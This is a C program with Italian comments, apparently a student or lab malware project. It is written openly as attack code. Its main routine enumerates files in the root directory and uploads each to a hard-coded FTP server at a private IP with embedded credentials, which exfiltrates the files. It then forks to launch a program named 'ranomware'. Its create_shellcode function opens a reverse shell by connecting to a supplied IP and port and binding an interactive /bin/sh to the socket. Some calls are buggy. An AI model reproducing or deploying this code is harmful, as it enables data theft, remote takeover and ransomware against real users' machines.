#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>

void create_shellcode(char *ip, char* port);


char** listFiles(const char *path, int *numFiles) {
    DIR *dir;
    struct dirent *entry;
    char **fileList = NULL;
    int count = 0;

    // Apri la cartella
    dir = opendir(path);
    if (dir == NULL) {
        perror("Impossibile aprire la cartella");
        return NULL;
    }

    // Conta il numero di file nella cartella
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {  // Verifica se è un file regolare
            count++;
        }
    }

    // Alloca l'array di stringhe per contenere i percorsi dei file
    fileList = (char**)malloc(count * sizeof(char*));
    if (fileList == NULL) {
        perror("Errore durante l'allocazione della memoria");
        closedir(dir);
        return NULL;
    }

    // Resetta il puntatore della cartella all'inizio
    rewinddir(dir);

    // Memorizza i percorsi dei file nell'array
    count = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {  // Verifica se è un file regolare
            char *filePath = (char*)malloc((strlen(path) + strlen(entry->d_name) + 2) * sizeof(char));
            if (filePath == NULL) {
                perror("Errore durante l'allocazione della memoria");
                closedir(dir);
                // Libera la memoria allocata finora
                for (int i = 0; i < count; i++) {
                    free(fileList[i]);
                }
                free(fileList);
                return NULL;
            }
            sprintf(filePath, "%s/%s", path, entry->d_name);
            fileList[count] = filePath;
            count++;
        }
    }

    closedir(dir);
    *numFiles = count;
    return fileList;
}

// Funzione di callback per scrivere i dati su un file
size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    printf("Scrivo %zu elementi di dimensione %zu\n", nmemb, size);
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

// Funzione per ottenere l'elenco dei file su un server FTP
int list_files_ftp(const char *ftp_url) {
    CURL *curl;
    CURLcode res;

    // Inizializza la libreria curl
    curl_global_init(CURL_GLOBAL_ALL);

    // Inizializza una nuova sessione curl
    curl = curl_easy_init();
    if (curl) {
        // Imposta l'URL FTP di destinazione
        curl_easy_setopt(curl, CURLOPT_URL, ftp_url);
        curl_easy_setopt(curl, CURLOPT_USERNAME, "unina");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "unina");
        // Imposta la funzione di callback per scrivere i dati su stdout
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, stdout);

        // Esegue l'operazione di LIST
        res = curl_easy_perform(curl);

        // Verifica se l'operazione è stata completata con successo
        if (res != CURLE_OK) {
            printf("Errore durante l'ottenimento dell'elenco dei file su FTP: %s\n", curl_easy_strerror(res));
        }

        // Termina la sessione curl
        curl_easy_cleanup(curl);
    } else {
        printf("Impossibile inizializzare la sessione curl.\n");
    }

    // Libera le risorse della libreria curl
    curl_global_cleanup();

    return 0;
}


// Funzione per caricare un file su un server FTP
int upload_file_ftp(const char *ftp_url, const char *local_file_path) {
    CURL *curl;
    CURLcode res;
    FILE *local_file;
    
    // Inizializza la libreria curl
    curl_global_init(CURL_GLOBAL_ALL);
    
    // Inizializza una nuova sessione curl
    curl = curl_easy_init();
    if (curl) {
        // Apri il file locale in modalità lettura
        local_file = fopen(local_file_path, "rb");
        if (local_file) {
            // Imposta l'URL FTP di destinazione
            curl_easy_setopt(curl, CURLOPT_URL, ftp_url);
            curl_easy_setopt(curl, CURLOPT_USERNAME, "unina");
            curl_easy_setopt(curl, CURLOPT_PASSWORD, "unina");
            // Imposta la funzione di callback per scrivere i dati su un file
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
            
            // Imposta il file locale come sorgente dei dati
            curl_easy_setopt(curl, CURLOPT_READDATA, local_file);
            curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
            curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)-1);
            curl_easy_setopt(curl, CURLOPT_FTP_CREATE_MISSING_DIRS, 1L);
            char url[100];  // Buffer per memorizzare l'URL completo
            snprintf(url, sizeof(url), "ftp://192.168.1.84:21/Desktop/%s", local_file_path);

            curl_easy_setopt(curl, CURLOPT_URL, url);

            // Esegue l'operazione di upload
            res = curl_easy_perform(curl);
            
            // Verifica se l'upload è stato completato con successo
            if (res == CURLE_OK) {
                printf("File caricato con successo su FTP.\n");
                printf("res: %d\n", res);
            } else {
                printf("Errore durante l'upload del file su FTP: %s\n", curl_easy_strerror(res));
            }
            
            // Chiudi il file locale
            fclose(local_file);
        } else {
            printf("Impossibile aprire il file locale: %s\n", local_file_path);
        }
        
        // Termina la sessione curl
        curl_easy_cleanup(curl);
    } else {
        printf("Impossibile inizializzare la sessione curl.\n");
    }
    
    // Libera le risorse della libreria curl
    curl_global_cleanup();
    
    return 0;
}


int main(int argc, char **argv){

    // Copia il file su un server FTP

    int numFiles;
    char **files = listFiles("/", &numFiles);
    const char *ftp_url = "ftp://192.168.1.84:21/Desktop/ftp/";
    //list_files_ftp(ftp_url);
    for(int i = 0; i < numFiles; i++){
        upload_file_ftp(ftp_url, files[i]);
    }
    pid_t pid = fork();
    if(pid == 0) {
        execl("./","ranomware", NULL, NULL);
    } else {
        create_shellcode(argv[1], argv[2]);
        return 0;
    }
}

void create_shellcode(char *ip, char* port)
{
    int scktd;
    struct sockaddr_in client;

    client.sin_family = AF_INET;
    client.sin_addr.s_addr = inet_addr(ip);
    client.sin_port = htons(port);
    scktd = socket(AF_INET, SOCK_STREAM, 0);
    connect(scktd, (struct sockaddr *)&client, sizeof(client));
    dup2(scktd, 0); // STDIN
    dup2(scktd, 1); // STDOUT
    dup2(scktd, 2); // STDERR
    execl("/bin/sh", "sh", "-i", NULL, NULL);
}


